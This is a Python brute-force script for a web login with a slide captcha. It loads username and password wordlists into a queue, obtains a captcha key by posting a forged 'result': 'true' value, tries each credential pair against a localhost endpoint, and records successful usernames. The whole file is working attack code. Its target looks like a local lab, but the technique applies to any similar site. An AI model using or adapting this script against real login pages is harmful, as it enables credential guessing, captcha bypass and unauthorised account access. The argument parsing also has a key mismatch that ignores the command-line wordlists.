import argparse
import json
import requests

from bruteforce import bruteforce,dict_queue, success_username


def login():
    """
    登录和检测登录结果的代码针对每个网站分别完成
    login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
    :return:
    """
    try:
        login_info = dict_queue.get(block=False)
    except:
        return

    username = login_info[0]
    # 如果这个用户名已经被爆破出来密码，那么跳过这个用户名
    if username in success_username:
        return

    password = login_info[1]
    # username = 'aaaaaa'
    # password = "lcr123456"

    ################################实现登录过程开始
    captcha = {
        'un':username,
        'result': 'true'
    }
    r = requests.post("http://127.0.0.1:8000/user/login_slide_captcha/slide_captcha/", data=captcha)
    key = json.loads(r.content)

    payload = {
        "username": username,
        "password": password,
        "key": key['key']
    }
    r = requests.post("http://127.0.0.1:8000/user/login_slide_captcha/", data=payload)
    # r = requests.post("https://httpbin.org/post", data=payload)
    # 判断是否登录成功
    # print(r.text)
    ##################################实现登录过程结束

    ##################################检查密码是否正确开始
#    if True:
    if r.content == b'success':  # 根据实际情况修改此处，判定登录成功
        msg = login_info
        # 登录成功则把登录信息保存到success_queue
        success_username.append(username)
        print(msg)

    ################################## 检查密码是否正确结束


def get_dict(dict_user, dict_pass):
    """
    生成字典队列
    :return:
    """
    with open("dict/{}".format(dict_user)) as f:
        username = [line.strip() for line in f.readlines()]

    with open('dict/{}'.format(dict_pass)) as f:
        passwords = [line.strip() for line in f.readlines()]

    count = 0
    for u in username:
        for p in passwords:
            count += 1
            pair = (u, p)
            dict_queue.put(pair)
    print("字典生成完成，长度 {}".format(count))


def get_parse() -> dict:
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", "-u", help="用户名字典")
    parser.add_argument("--password", "-p", help="密码字典")
    dic = vars(parser.parse_args())
    return dic


if __name__ == "__main__":
    args = get_parse()
    dict_username = args.get('dict_username', "username.txt")
    dict_password = args.get('dict_password', "password.txt")

    get_dict(dict_username, dict_password)

    bruteforce(login, thread_num=1)
